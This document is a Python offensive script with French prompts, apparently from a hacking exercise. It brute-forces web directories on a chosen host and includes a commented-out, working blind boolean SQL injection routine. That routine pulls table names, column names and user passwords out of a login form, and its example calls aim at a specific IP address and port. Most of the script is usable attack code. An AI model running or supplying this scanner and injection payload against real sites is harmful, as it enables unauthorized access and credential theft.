#/usr/bin/python3

from pip._vendor import requests
from logging import exception
import requests;
import socket;
import sys;

print("""------------------------------------------------------------------------
    ___                          _             __  __           __  
   /   |  ____ ___  ____ _____  (_)___  ____ _/ / / /___ ______/ /__
  / /| | / __ `__ \/ __ `/_  / / / __ \/ __ `/ /_/ / __ `/ ___/ //_/
 / ___ |/ / / / / / /_/ / / /_/ / / / / /_/ / __  / /_/ / /__/ /   
/_/  |_/_/ /_/ /_/\__,_/ /___/_/_/ /_/\__, /_/ /_/\__,_/\___/_/|_|  
                                     /____/                         
------------------------------------------------------------------------""")

def main():
    n = input("1 - Scanner le site\n2 - Injection du script\nEntrer un numéro : ")

    if n == '1':
        scan()

##----------------------------------------------------------------------------------------

def scan():
    print("************************************************************************************")
    print("**************************Bienvenue sur le scan du Siteweb**************************")
    print("************************************************************************************")
    url = input("Enter l'adresse du site: ")

    tgtHost = url
    pathToDirList = '/usr/share/dict/french'

    hostsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        status = hostsocket.connect_ex( (tgtHost, 80) )
        hostsocket.close()
        if ( status == 0 ):
            print ('\n==Connexion en cours . . . OK==')
            pass
        else:
            print (('\n*** Cannot reach specified host %s***') %(tgtHost))
            sys.exit(1)
    except socket.error:
        print ('\nexception in connect_ex')
        sys.exit(1)

    print ('\nImportation de votre liste de mots... cela peut prendre un moment')

    def dirchecker(listOfPaths):
        try:
            response_code = requests.get('http://' + tgtHost + '/' + listOfPaths).status_code
        except Exception:
            sys.exit(1)
        if (response_code == 200):
            print (('\nhttp://%s/%s : FOUND') %(tgtHost, listOfPaths))
            
    try:
        with open(pathToDirList) as file:
            import_list = file.read().strip().split('\n')
    except IOError:
        print ("\nimpossible d'importer votre liste de mots")
        sys.exit(1)

    for i in range(len(import_list)):
        dirchecker(import_list[i])

    print ('\nFini')

##----------------------------------------------------------------------------------------
if __name__ == "__main__":
    main()

# def search(name, endPayload, URL, limit) : 
#     list_char = [chr(x) for x in range(32, 127)]
#     index = 1
#     result = ""
#     while index != 0 : 
#         for char in list_char : 
#             payload = "admin' and (SELECT substr(" + name + "," + str(index) + ",1) = '" + char + "' " + endPayload + limit
#             data = { "login" : payload, "password" : "foo"}
#             re = requests.post(url=URL, data=data)
#             if "Error Wrong credentials" not in re.text : 
#                 result += char
#                 index = index + 1
#                 break
#             if char == "~" :
#                 print(result)
#                 index = 0
#                 return result


# # search("name", "FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'", "http://37.187.125.224:8091", " limit 1) -- -")
# # search("name", "FROM PRAGMA_TABLE_INFO('users')", "http://37.187.125.224:8091", " limit 1, 2) -- -")
# search("name", "FROM PRAGMA_TABLE_INFO('" + search("name", "FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'", "http://37.187.125.224:8091", " limit 1) -- -") + "')", "http://37.187.125.224:8091", " limit 1, 2) -- -")
# search("password", "FROM users", "http://37.187.125.224:8091", " limit 1)-- -")

# # admin' and (SELECT substr(password, 1, 1) = "_" FROM users limit 1) -- -